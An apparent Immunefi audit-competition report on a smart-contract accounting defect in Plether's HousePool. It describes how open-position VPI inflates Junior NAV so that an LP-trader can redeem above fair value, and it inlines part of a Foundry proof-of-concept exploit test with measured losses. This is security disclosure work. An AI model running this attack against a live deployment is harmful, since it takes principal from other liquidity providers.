# \#97770 [SC-Critical] Positive VPI from an open position is counted as distributable Junior NAV, letting an LP-trader redeem above fair value and take principal from other Junior LPs

**Submitted on Nov 3rd 2026 at 03:21:31 UTC by @Naveen0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97770
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

A trade that increases skew pays a positive VPI charge into the pool. That cash lands in `physicalAssets`, and `buildReconcileSnapshot` treats it as distributable Junior equity. The refund that the very same position is entitled to when it closes is never booked as a liability at reconcile. Matured Junior redemptions are then priced off an inflated `juniorPrincipal`.

Any unprivileged account that is both a Junior LP and a trader can turn this into a transfer of principal. It deposits at fair NAV, requests a redemption, opens a skew-increasing position shortly before the redemption boundary, lets an unrelated keeper settle the epoch while the position is still open, and then closes. The redemption is paid above fair value, and the close hands the VPI charge straight back to the same account. The other Junior holders fund the difference.

The whole thing runs through the ordinary user-facing paths: `TrancheVault.requestDeposit` / `claimDeposit`, `requestRedeem` / `claimRedeem`, `OrderRouter.commitOrder` and the permissionless `OrderRouter.settleLpEpoch`. No privileged role, no governance action, no oracle control, no reentrancy.

In a Foundry run built on the repository's own test fixture, a Junior incumbent that only deposited and redeemed ended **447.957052 USDG below** its no-trade control after a single cycle, and below the USDG it deposited in absolute terms. Across eight cycles on a 20M pool the Junior incumbents ended **67463.818349 USDG below control**.

**Affected asset:** `HousePool` (holds active LP USDG) and the Junior tranche deposit / redemption pricing it drives.

**Affected code:**

- `packages/perps/src/libraries/HousePoolAccountingLib.sol` — `buildReconcileSnapshot`, lines 60-78 (primary defect)
- `packages/perps/src/CfdEngineProtocolLens.sol` — lines 63-64
- `packages/perps/src/TerminalNavBookV2.sol` — lines 320-349
- `packages/perps/src/libraries/CloseAccountingLib.sol` — lines 112-118
- `packages/perps/src/libraries/CfdEnginePlanLib.sol` — lines 1059-1068
- `packages/perps/src/HousePool.sol` — lines 809-819, 835-840, 915, 1147-1152
- `packages/perps/src/OrderRouter.sol` — `settleLpEpoch`, lines 479-484

**Commit reviewed:** `a82d4fefb02768e5b3bddcc97dee371eee24fea8`

## Root cause

`buildReconcileSnapshot` (`HousePoolAccountingLib.sol:63-74`) starts `terminalAssets` from `physicalAssets`, adds only a positive terminal price delta, subtracts `traderClaimBalanceAssets`, and returns `distributable = terminalAssets - terminalLiabilities`. There is no VPI term on either side of that expression.

The pieces that make that omission exploitable:

- `CfdEngineProtocolLens.sol:63-64` — `physicalAssets` is the pool's `totalAssets()`, which already contains the VPI charge collected at open. So the charge is inside NAV from the moment it is paid.
- `TerminalNavBookV2.sol:320-349` — the terminal LP delta is `slope * markPrice + intercept` over the radix coefficients. It covers mark-to-market price only, so nothing elsewhere compensates for the missing VPI liability.
- `CloseAccountingLib.sol:116-118` — when the position's own skew-reducing close nets a rebate, the lifetime clamp caps the refund at that position's positive `vpiAccrued`. In other words the amount the position can recover is fixed at open and is known in advance, and reconcile books nothing against it. The clamp's comment at `:112-115` explains it was added to stop sandwiches that reduce pool depth before closing; this attack needs no depth change at all.
- `HousePool.sol:835` runs `_reconcile`, and `HousePool.sol:840` then sets `juniorPhase.pricingPrincipal = juniorPrincipal`. `HousePool.sol:915` does the same for Junior deposits settled in that epoch. Both prices are therefore taken *after* reconcile, while the attacker's position is still open and its refundable charge is still sitting in NAV.
- `OrderRouter.sol:479-484` (`settleLpEpoch`) is permissionless, and with open positions `HousePool.sol:809-819` only requires the caller to be the engine's order router and the mark to be fresh. The router call satisfies both, so settlement with an open position is a normal, callable state.
- `CfdEnginePlanLib.sol:1059-1068` — when a close nets a rebate, no close charge is assessed, so the close-leg execution fee is never routed to the treasury and stays in the pool. That is a small offset to the attacker's cost, not a defence.

Put simply: the protocol recognises a refundable liability as equity, and the price at which other people buy and sell that equity is taken while the refund is still outstanding.

## Attack path

The figures below come from the primary one-cycle arm: a Junior-only pool with a 1000000.000000 USDG incumbent and a 1000000.000000 USDG attacker.

1. **Deposit at fair NAV.** The attacker deposits 1000000.000000 USDG into the Junior `TrancheVault` while holding no position, so its shares are minted at an unmanipulated price.
2. **Request redemption.** After the deposit cooldown the attacker requests redemption of all of its shares. The request matures at the next epoch boundary (`HousePool.sol:178`). At that point the attacker holds 0.4997 of Junior supply.
3. **Open just before the boundary.** Shortly before the boundary the attacker commits a LONG and an unrelated keeper executes it. Notional is 799800.000000 USDG, which is the 0.4-of-depth maximum skew on a depth of 2002000.000000 less a small slack. The open pays a VPI charge of c = 1597.522618 USDG into the pool. The 4 bp open fee of 319.920000 goes to the treasury.
4. **An unrelated keeper settles.** Just after the boundary a keeper EOA calls the permissionless `settleLpEpoch`. Reconcile counts c as distributable, and the matured redemption is priced from the inflated principal. The redemption uplift over control is 808.355258 USDG, against a first-order prediction of f·c = 798.362747.
5. **Close after settlement.** With the redemption already priced, the attacker closes. The lifetime clamp returns the charge, net of the close-leg fee the pool keeps. The attacker's clearinghouse delta over the whole trader leg is only -680.062942, i.e. it gets nearly all of c back.
6. **Claim.** The attacker claims the redemption and receives 1000808.346110 USDG. Net result is **+128.283168** against a control of -0.009148.
7. **Repeat.** On a 20M pool run for eight cycles inside roughly 24 hours, every cycle is profitable, from 3847.002142 in the first to 3902.748303 in the eighth, for a cumulative **+30998.201365** against a control of -1316.207978.

The victims do nothing unusual. They realise their losses through the ordinary request / settle / claim path.

## Impact

All numbers are measured in the PoC below. "Control" means the identical flow from the same snapshot with the attacker performing only the LP round trip and no trade.

**Single cycle, 1M incumbent vs 1M attacker (f = 0.4997, c = 1597.522618).** The incumbent deposited 1000000.000000 and realised 999552.006388 in the attack arm against 999999.963440 in control. That is 447.957052 lost against control and 447.993612 below its own deposit. The attacker netted +128.283168 against -0.009148 in control, and the treasury took 319.912002. Because the control is whole to 0.036560 USDG, the absolute loss here is entirely attack-caused.

**Single cycle, 20M pool, Junior incumbents 5M (f = 0.5999, c = 21996.500315).** Incumbents realised 4991069.575367 against 4999479.407008 in control: 8409.831641 lost against control, 8930.424633 below deposits. Attacker +3847.002142 against -164.498867.

**Eight cycles inside ~24 hours, 20M pool.** Incumbents realised 4930290.352492 against 4997754.170841 in control: 67463.818349 lost against control, 69709.647508 below deposits. Attacker +30998.201365 against -1316.207978, a delta of 32314.409343. Treasury 35161.280946.

**Single cycle, 50M pool at the 80% Senior cap, Junior incumbents 10M (f = 0.5999, c = 51993.802347).** Incumbents realised 9978729.265177 against 9998611.755752 in control: 19882.490575 lost against control, 21270.734823 below deposits. Attacker +9046.162284 against -438.653465.

At scale the no-trade control is not exactly whole because the Senior coupon accrues in the fixture, so the attack-attributable figure is always the loss against control; the control drift is printed in every arm. Conservation (attacker + treasury + keeper + every victim + seed holders, arm minus control) nets to 0.000000 in each of the arms above, so nothing is created and the attacker's gain is funded by the other holders.

### A majority Junior share is not required

With an unrelated trader already long on the same side, a 0.3330 share of Junior supply is enough. Incumbents hold 2000000.000000 USDG of Junior across two EOAs, an honest trader opens a 750000.000000 LONG before the attacker deposits, and the attacker then deposits 1000000.000000 at fair NAV and adds a 450300.000000 LONG before maturity. Total skew is 0.3996 of depth, inside the 0.4 cap. The open charge is c = 1461.967742 and the redemption uplift is 490.678946, about 0.8% above f·c.

Incumbents realise 2000053.648606 against 2000341.715493 in control, so they are 288.066887 worse off than they should be. The attacker nets +107.699532 against -0.006098 in control, and the same open closed *before* settlement loses 315.846376. The honest trader is not the victim: its PnL is -641.937807 in the attack arm against -642.127379 in control. Most of the remainder of the incumbents' loss is the attacker's open fee, which goes to the treasury (480.107997 against 299.992500 in control).

In this arm the incumbents still end above their deposit in absolute terms, because the honest trader's fees accrue to the pool. The claim here is a loss against control, not an absolute loss. With no other trader in the market, the arithmetic break-even share is about 0.43 (trader-leg cost 680.062942 divided by c = 1597.522618 in the primary arm).

### A second class of victim: depositors settling in the same epoch

In a depth-neutral variant, a third party deposits 1500000.000000 USDG in the same epoch and therefore buys shares at the inflated price. That depositor realises 1499057.404267 against 1499999.989028 in control, losing 942.584761. The incumbent actually gains 179.777873 in that arm, but the Junior holders as a group end 762.841631 below what they deposited. So the loss does not always land on incumbents; whoever transacts at the manipulated price pays.

### Economics

Attacker gain is roughly f·c minus the open and close execution fees, less price cost. In the primary arm f·c = 798.362747 and each 4 bp leg is 319.920000, leaving 158.522747; the measured net is +128.283168, with the remaining ~30 USDG being price and spread cost. The loss to the other Junior holders is the redemption uplift less the trader payments that stay in the pool: 447.957052 lost against an uplift of 808.355258.

Attacker capital across the measured arms runs from 1013509.000000 to 62637162.000000 USDG minted, the largest figure being cumulative over eight cycles with the stake re-deposited each time.

### Why this is a code defect and not a market/economic attack

The profit comes entirely from an omission in `buildReconcileSnapshot`: no liability is booked for a refund that is already determined at open and capped by `CloseAccountingLib.sol:116-118`. Book that liability and the transfer disappears. No vote, no privileged role, no market-wide price move and no majority of anything is involved; the attacker obtains its Junior share through ordinary deposits at fair NAV one cooldown before settlement, needs no pre-existing stake, and profits with a 0.3330 share in the measured sub-majority arm.

## Relation to the documented design

The design documents describe the NAV definition the code implements, but they do not sanction this transfer. Paraphrasing the relevant passages:

- `SECURITY.md:859-860` states that new LPs should not enter at a higher deposit NAV than the marked-liability discount existing LPs bear. Here they enter at a NAV inflated by a refund that has not yet been paid out.
- `SECURITY.md:863` keeps VPI and the other action economics outside the pre-close price book, which is exactly where the code leaves them — the problem is that the *collected cash* is simultaneously inside `physicalAssets`, which `WHITEPAPER.md:411-413` confirms is where a positive VPI charge lands.
- `SECURITY.md:866-867` and `ACCOUNTING_SPEC.md:821-822` give *negative* lifetime VPI a dedicated nonwithdrawable reserve that LPs cannot extract before the matching obligation settles. No equivalent protection exists for the positive charge that the same position can recover on close. That asymmetry is the defect.
- The "unfunded value is waived rather than claim-backed" language in `SECURITY.md:871-872` and `WHITEPAPER.md:885-888` is a payment-priority rule for when free cash is short. In the measured runs nothing was waived: the close preview showed a VPI delta of -1597.602497, the trader received +1277.649554 (the refund net of the close-leg fee the pool keeps), and pool cash fell by the same amount.
- `ACCOUNTING_SPEC.md:738-740` explicitly accepts a timing transfer for pending *carry*, which cannot be reversed. A positive VPI charge is different: it is refundable up to `vpiAccrued`, and no equivalent allowance was written for it.
- The clamp comment at `CloseAccountingLib.sol:112-115` says the clamp exists to stop sandwiches that reduce pool depth. It does that, but it also fixes the recoverable refund at open while reconcile books nothing for it, and this attack needs no depth reduction.
- The VPI limitations list at `SECURITY.md:1434-1444` does not describe this mechanism.

## Relation to the known-issues list

The known-issue list excludes findings from the AI scan report, which contains an entry about a temporary reduction of pool liquidity amplifying a skew-reducing close rebate. That mechanism requires pool depth to fall between open and close. This one does not, and the depth-neutral test demonstrates the difference directly:

- A same-size third-party Junior deposit holds pool depth at close at 10003 bps of depth at open, i.e. flat.
- The unclamped close curve at close depth is 1996.975848 against an open charge of c = 1997.502119, so the refund is already ~c without any depth reduction and the clamp does not need to bind.
- The attacker still nets +362.506407 against a control of -0.010979, with a redemption uplift of 1213.013819 against f·c = 1198.022806.

The profit therefore comes from NAV recognition at reconcile, not from a depth-driven rebate. The LP refund-epoch and redemption-rounding items on the known-issue list are unrelated mechanisms (zero-payout refund epochs and rounding).

## Preconditions

- **Junior share.** At settlement the attacker must hold enough of Junior supply that its redemption uplift exceeds the trader-leg cost. Measured working shares are 0.3330 (with same-side honest flow) and 0.4997 to 0.5999 (with no other trader). Break-even with no other trader is about 0.43.
- **Same-side flow, for the sub-majority variant only.** The 0.3330 case needs an unrelated trader with a same-side position open at the moment the attacker opens; in the test that is 0.2497 of depth. The attacker does not control that flow.
- **Room to open.** The open must increase skew and there must be room under `maxSkewRatio` (0.4 of depth).
- **No offsetting trade.** No third party may reduce skew between settlement and the attacker's close.
- **Live market.** The market must be live and not oracle-frozen; live redemptions pay no exit fee (`HousePool.sol:1147-1152`).
- **Free cash covers the rebate.** If free pool cash is short the rebate is partly waived (`CfdEnginePlanLib.sol:973-976`). This was never hit in the measured runs.
- **Price risk.** The attacker's net turns negative at an adverse close move of 3.97 bp with zero oracle confidence, or 3.62 bp with 1 bp confidence (f = 0.5997, notional 999800.000000).

## Limitations, disclosed honestly

- **Ordering risk.** If a third party sells short half the attacker's size between settlement and the close, the attacker nets -1610.310353 where the uninterrupted arm nets +347.436539. The conservation check does not close in that interposed arm (residual 420.866850, which I have not explained), so no claim above depends on it.
- **Share threshold.** The sub-majority result uses one honest LONG of a fixed size; real same-side flow is not modelled. The 0.43 no-other-trader break-even is arithmetic from the primary arm, not a measured sweep.
- **Price path.** All measured arms use a flat basket price; path risk over the holding window is not tested.
- **Basket.** The test uses a two-feed flat-price basket rather than the six-feed production basket. VPI depends on skew and depth rather than basket composition, but that is not measured here.
- **Environment.** The test runs against local Foundry state, not against any deployed build.
- **Not covered.** Frozen-market and FAD windows, organic order flow, sustained multi-cycle extraction at the 80% Senior cap (one cycle only at 50M), and gas costs.

## Recommended fix

Track live VPI and keep its positive part out of distributable equity until the matching position actually settles.

Concretely: keep a signed running total of live `vpiAccrued` across accounts in `TerminalNavBookV2`, updated on each per-account curve sync (previous value out, new value in, zero when the account goes flat). Then in `CfdEngineProtocolLens.getHousePoolInputSnapshot`, while positions are open, subtract the positive part of that total from `terminalLpPriceDeltaAssets`. Net positive live VPI then stays outside distributable Junior equity until the position closes or is liquidated, while net negative live VPI stays unrecognised exactly as the documents describe.

Trade-offs worth flagging:

- VPI remains LP revenue. Only the moment of recognition moves, from open to close/liquidation.
- Any replacement of `TerminalNavBookV2` while positions are open must seed the running total from the live positions, or the fix silently starts from zero.
- I built a prototype of this in a separate copy of the tests: the attack arms then fail their attack-premise assertions, while the no-trade control and the fee-routing check still pass. I have not run the sub-majority variant or the full regression suite against the prototype, and a small residual uplift remains that I have not fully explained, so please treat the prototype as a direction rather than a finished patch.

A cheaper alternative, if touching the terminal book is undesirable, is to refuse to price matured Junior deposits and redemptions off a principal that includes unsettled refundable VPI — for example by deferring epoch settlement pricing for accounts with open positive-VPI positions, or by holding an explicit nonwithdrawable reserve for positive live `vpiAccrued` mirroring the one that already exists for negative lifetime VPI.

Sketch (illustrative, not compiled):

```diff
--- a/packages/perps/src/TerminalNavBookV2.sol
+++ b/packages/perps/src/TerminalNavBookV2.sol
+    mapping(address account => int256 liveVpiAccruedAssets) private _liveVpiAccruedAssets;
+    int256 public totalLiveVpiAccruedAssets;
...
     // inside the per-account curve sync, after the position is read:
+    _syncLiveVpi(account);   // moves prev -> next in totalLiveVpiAccruedAssets; next = 0 when flat

--- a/packages/perps/src/CfdEngineProtocolLens.sol
+++ b/packages/perps/src/CfdEngineProtocolLens.sol
     snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
+    if (terminalSnapshot.hasOpenPositions) {
+        int256 liveVpi = terminalNavBook.totalLiveVpiAccruedAssets();
+        if (liveVpi > 0) snapshot.terminalLpPriceDeltaAssets -= liveVpi;
+    }
```

## Proof of Concept

The attachment option is not available on this form, so the complete Foundry test file is inlined below. Save it as `VpiNavJuniorExtractionPoC.t.sol` inside the perps package's test directory (any subdirectory works; the file imports `test/perps/BasePerpTest.sol`, which pulls in `test/utils/LegacyOrderRouterHarness.sol`, and `MockPyth` through the existing `@plether/test-utils` remapping). **No changes to `src` are required.**

Run it from the perps package:

```bash
FOUNDRY_FFI=false FOUNDRY_DYNAMIC_TEST_LINKING=true forge test --match-path '**/VpiNavJuniorExtractionPoC.t.sol' -vv
```

All 11 tests pass, with identical logged values on current Forge releases, using solc 0.8.35 with via-IR and 200 optimizer runs as configured in the repository.

Tests included: `test_Attack_UnprivilegedIncumbent_AbsoluteLoss`, `test_Control_NoTrade`, `test_NegControl_SameTradesClosedBeforeSettlement`, `test_SubMajorityShare_WithHonestSkew_Profitable`, `test_DepthNeutral_DepositorOverpays`, `test_PriceSensitivity`, `test_OrderingRisk_Disclosed`, `test_Scale_D20M_S75_f060_RealizedClaims`, `test_Scale_D20M_S75_f060_EightCyclesPerDay_RealizedClaims`, `test_Scale_D50M_S80cap_f060_RealizedClaims`, `test_CloseFeeRouting`.

A few notes on how the PoC is set up, so nothing looks like it was smuggled in:

- Every actor is an unprivileged EOA created with `makeAddr`. The keeper is unrelated to the attacker and executes orders and calls `settleLpEpoch`. Victims only ever use `requestDeposit` / `claimDeposit` and `requestRedeem` / `claimRedeem`.
- The only owner calls are in `setUp`, and they only apply release configuration through the documented timelocks: 4 bp execution fee, 25 bp settlement buffer, 2500 adverse confidence multiplier, 1000e6 minimum open notional, 40M Senior exposure cap and an 8000 bp Senior share. No owner, guardian, pauser or oracle-worker action happens during the attack itself.
- Orders go through `LegacyOrderRouterHarness`, a test-only subclass of the production `OrderRouter` that builds a production V3 `OrderRequest` with every caller bound at its maximum and delegatecalls the production commit path. Any EOA can submit the same request.
- Cheatcodes used are limited to `vm.prank`, `vm.startPrank`, `vm.warp`, `vm.roll`, `vm.snapshotState`, `vm.revertToState`, `vm.toString` and `makeAddr`. There is no `vm.store`, `vm.etch`, `vm.mockCall`, `deal`, `vm.load` or `vm.setNonce`; funding goes through `MockSettlementToken.mint` or the repository's own `_fundTrader` helper.
- Every attack arm is run from the same snapshot as its control, so the two differ only in whether the attacker trades and when it closes.

### Console output (trimmed of gas and timing lines)

```text
  [MAIN attack] f (attacker share of Junior supply) = 0.4997
  [MAIN attack] c (open VPI charge) USDG = 1597.522618 ; notional USDG = 799800.000000
  [MAIN attack] attacker NET PnL USDG = 128.283168 ; stuck shares valued = 0.000000
  [MAIN attack] trader leg PnL (first cycle, clearinghouse delta) USDG = -680.062942
  [MAIN_f050] f = 0.4997 ; c USDG = 1597.522618 ; f*c USDG = 798.362747
  [MAIN_f050] LOSS VS CONTROL USDG = 447.957052
  [MAIN_f050] attacker NET (attack) USDG = 128.283168 ; attacker NET (control) USDG = -0.009148
  [MAIN_f050] redemption uplift vs control USDG = 808.355258
  [MAIN_f050] conservation residual (should be ~0) USDG = 0.000000
  [SUBMAJ] f = 0.3330 ; honest skew ratio = 0.2497 ; c USDG = 1461.967742
  [SUBMAJ] honest LONG notional USDG = 750000.000000 ; attacker LONG notional USDG = 450300.000000
  [SUBMAJ] total skew / depth at open = 0.3996 (cap 0.4000)
  [SUBMAJ] ATTACKER NET USDG = 107.699532 ; control = -0.006098 ; neg-control = -315.846376
  [SUBMAJ] INCUMBENT LOSS VS CONTROL USDG = 288.066887 ; attack = 2000053.648606 vs control = 2000341.715493
  [SUBMAJ] honest trader PnL control = -642.127379 ; attack = -641.937807 (the honest trader is not the victim)
  [DAY20M] cycle 0 : f = 0.5999 ; c USDG = 21996.500315 ; attacker cycle PnL USDG = 3847.002142
  [SCALE_D20M_S75_f060_8cycles] LOSS VS CONTROL USDG = 67463.818349
  [SCALE_D20M_S75_f060_8cycles] attacker net delta vs control USDG = 32314.409343
  Suite result: ok. 11 passed; 0 failed; 0 skipped
```

### Negative controls contained in the same file

- No trade at all: the incumbent ends whole at 999999.963440 and the attacker at -0.009148.
- The same open and close, completed *before* settlement: the attacker loses 500.727765 and the incumbent ends 180.426467 *above* control.
- Same shape in the sub-majority variant: closed before settlement, the attacker nets -315.846376.

The only difference between the profitable arm and the losing arm is whether the position is still open when the epoch settles. That is the whole bug.

## Proof of Concept

## Proof of Concept (Full test file)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// =====================================================================================================================
// Proof of concept for the Plether perps LP accounting at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.
//
// Claim: positive VPI that a skew-increasing open pays into the pool is held as pool cash and is counted as distributable
// Junior NAV at settlement. No liability is booked for the refund that a same-skew close pays back to the same position.
// A Junior LP that holds matured shares, opens before its redemption settles, and closes after settlement redeems at a
// price above fair value. The excess is funded by the other Junior holders.
//
// Code anchors (packages/perps/src at the commit above):
//   libraries/HousePoolAccountingLib.sol:60-78   buildReconcileSnapshot: no liability term for collected positive VPI
//   HousePool.sol:835-840                        _settleLpEpoch: _reconcile, then juniorPhase.pricingPrincipal = juniorPrincipal
//   libraries/CloseAccountingLib.sol:112-117     lifetime clamp: a same-skew close refunds up to the positive vpiAccrued
//   libraries/CfdEnginePlanLib.sol:1059-1068     net-rebate close: no close fee is assessed, so the fee stays in the pool
//
// Actors: all unprivileged EOAs created with makeAddr. The keeper is an unrelated EOA that executes orders and calls the
// permissionless Router.settleLpEpoch. The attacker is a Junior LP that also trades. Victims realize only through
// TrancheVault requestDeposit/claimDeposit and requestRedeem/claimRedeem.
//
// Orders are submitted through LegacyOrderRouterHarness (test/utils), a test-only subclass of the production OrderRouter
// that builds a production V3 OrderRequest with every caller bound at its maximum and delegatecalls the production V3
// commit path. Any EOA can submit the same request.
//
// Setup (owner calls, setUp only): the release configuration is applied through the documented timelocks. This is
// configuration, not an attack step: executionFeeBps 4, settlementBufferBps 25, adverseConfidenceMultiplierBps 2500,
// basketMaxConfidenceRatioBps 10, minOpenNotionalAssets 1000e6, Senior exposure cap 40,000,000e6 and Senior share 8000 bps.
//
// Cheatcodes: vm.prank, vm.startPrank, vm.warp, vm.roll, vm.snapshotState, vm.revertToState, vm.toString, makeAddr.
// No vm.store, vm.etch, vm.mockCall, deal, vm.load or vm.setNonce. EOA funding uses MockSettlementToken.mint or the repo
// helper _fundTrader. Pyth is the repo MockPyth with a flat basket price and 1 bp per-feed confidence unless a test says
// otherwise.
// =====================================================================================================================

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract VpiNavJuniorExtractionPoC is BasePerpTest {

    uint256 internal constant VPI_FACTOR = 0.01e18;
    uint256 internal constant LOT = 100e18; // positionSizeQuantum
    uint256 internal constant P0 = 1e8;

    address internal keeper;
    address internal attacker;
    address internal incumbentA;
    address internal incumbentB;
    address internal seniorLp;
    address internal thirdDepositor;
    address internal honestTrader;

    uint256 internal price = P0;
    uint64 internal confE8 = 1e4; // per-feed Pyth confidence, 1e4 = 1 bp at price 1.0

    enum Mode {
        NoTrade, // LP round trip only (control)
        Attack, // open before the redemption boundary, unrelated keeper settles, close
        CloseBeforeSettle // identical open, closed BEFORE the settlement (negative control)
    }

    struct Scn {
        uint256[2] incDep;
        uint256[2] incShares;
        uint256 seniorDep;
        uint256 seniorShares;
    }

    struct Cfg {
        Mode mode;
        uint256 cycles;
        uint256 attackerDeposit;
        uint256 thirdDeposit; // third-party Junior deposit maturing with the attacker's redemption (single cycle)
        uint256 honestShortDiv; // 0 none; n => honest SHORT of size/n between settlement and the attacker's close
        uint256 closePrice; // 0 = flat; otherwise the feed price used for the attacker's close only
        uint256 sizeBps; // fraction of the max-skew size the attacker opens (10_000 = 100%)
        bool victimsExit; // victims realize through request/claim at the end
        uint256 honestSize; // 0 none; otherwise an unrelated honest LONG (size units) opened BEFORE the attacker's deposit
    }

    struct Res {
        // attacker
        int256 attackerNet;
        int256[] cumNet;
        uint256[] cycleC;
        uint256[] cycleF;
        uint256 minted;
        uint256 fWad;
        uint256 vpiC;
        uint256 notional;
        uint256 depthOpen;
        uint256 depthClose;
        uint256 redeemAssets;
        int256 traderLegPnl;
        uint256 stuckShares;
        uint256 stuckValue;
        uint256 elapsed;
        int256 honestVpi;
        uint256 honestNotional; // honest LONG notional (6-dec assets)
        int256 honestPnl; // honest trader wealth change over the whole run
        // fee routing / conservation
        uint256 treasuryDelta;
        uint256 treasuryOpenDelta;
        uint256 treasuryCloseDelta;
        int256 keeperDelta;
        int256 pvVpiDelta;
        uint256 pvFee;
        int256 traderCloseDelta;
        int256 poolCashCloseDelta;
        uint256 tmpTreasury;
        uint256 tmpCh;
        uint256 tmpCash;
        // victims (all realized through TrancheVault claims)
        uint256[2] incRealized;
        uint256[2] incWalletBefore;
        uint256[2] incWalletAfter;
        uint256 seniorRealized;
        uint256 depositorShares;
        uint256 depositorRealized;
        uint256 seedJ;
        uint256 seedS;
    }

    // ------------------------------------------------------------------------------------------------ release params

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: VPI_FACTOR,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev No privileged Junior holder: every Junior LP is funded as an EOA through the real vault flow.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        keeper = makeAddr("keeper");
        attacker = makeAddr("attacker");
        incumbentA = makeAddr("incumbent");
        incumbentB = makeAddr("incumbent2");
        seniorLp = makeAddr("seniorLp");
        thirdDepositor = makeAddr("thirdDepositor");
        honestTrader = makeAddr("honestTrader");

        // ---- OWNER CALLS (release alignment only, see header) ----
        ICfdEngineAdminHost.EngineRiskConfig memory ecfg = _engineRiskConfig();
        ecfg.executionFeeBps = 4;
        ecfg.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(ecfg);
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.minOpenNotionalAssets = 1000e6;
        routerAdmin.proposeRouterConfig(rc);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        routerAdmin.finalizeRouterConfig();
        _setSeniorCapacity(40_000_000e6, 8000);
        // ---- end owner calls ----

        vm.warp(SETUP_TIMESTAMP + 7 days); // live FX market, no FAD window
        vm.roll(vm.getBlockNumber() + 10);
        _markNow();

        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release min open notional");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
        assertEq(pool.maxSeniorShareBps(), 8000, "release senior share cap");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release senior exposure cap");
    }

    // ------------------------------------------------------------------------------------------------ plumbing

    function _advance(
        uint256 dt
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + dt);
    }

    function _warpTo(
        uint256 t
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(t);
    }

    function _ticks(
        uint256 t
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), confE8, -8, t, t - 1));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// @dev Permissionless mark refresh by the unrelated keeper EOA.
    function _markNow() internal {
        bytes[] memory d = _ticks(vm.getBlockTimestamp());
        vm.prank(keeper);
        router.updateMarkPrice(d);
    }

    function _mark() internal {
        _advance(1);
        _markNow();
    }

    /// @dev Permissionless Router.settleLpEpoch by the unrelated keeper EOA (works with open positions).
    function _routerSettle() internal {
        _advance(1);
        bytes[] memory d = _ticks(vm.getBlockTimestamp());
        vm.prank(keeper);
        router.settleLpEpoch(d);
    }

    /// @dev commitOrder by the trader, executeOrder by the unrelated keeper (the keeper bounty is a trader cost).
    function _trade(
        address who,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, isClose ? 0 : (side == CfdTypes.Side.LONG ? 1 : 2e8), isClose);
        uint256 commitTs = vm.getBlockTimestamp();
        _advance(2);
        bytes[] memory d = _ticks(commitTs + 1);
        vm.prank(keeper);
        router.executeOrder(id, d);
        (uint256 sizeAfter,,,,,,) = engine.positions(who);
        assertEq(sizeAfter, isClose ? 0 : size, "order must execute");
    }

    function _wealth(
        address who
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(who) + clearinghouse.balanceAssets(who);
    }

    function _treasuryBal() internal view returns (uint256) {
        return clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
    }

    /// @dev Largest lot-aligned notional at price 1.0 with |skew| <= 0.4 * depth, minus 1k USDG slack.
    function _maxSize(
        uint256 depth
    ) internal pure returns (uint256) {
        uint256 cap = depth * 4 / 10;
        uint256 room = cap > 1000e6 ? cap - 1000e6 : 0;
        return (room * 1e12) / LOT * LOT;
    }

    function _inc(
        uint256 i
    ) internal view returns (address) {
        return i == 0 ? incumbentA : incumbentB;
    }

    function _incName(
        uint256 i
    ) internal pure returns (string memory) {
        return i == 0 ? string.concat("incumbentA") : string.concat("incumbentB");
    }

    // ------------------------------------------------------------------------------------------------ LP flows

    function _requestDeposit(
        TrancheVault v,
        address lp,
        uint256 amount
    ) internal returns (uint256 id) {
        settlementToken.mint(lp, amount);
        _mark();
        vm.startPrank(lp);
        settlementToken.approve(address(v), amount);
        id = v.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

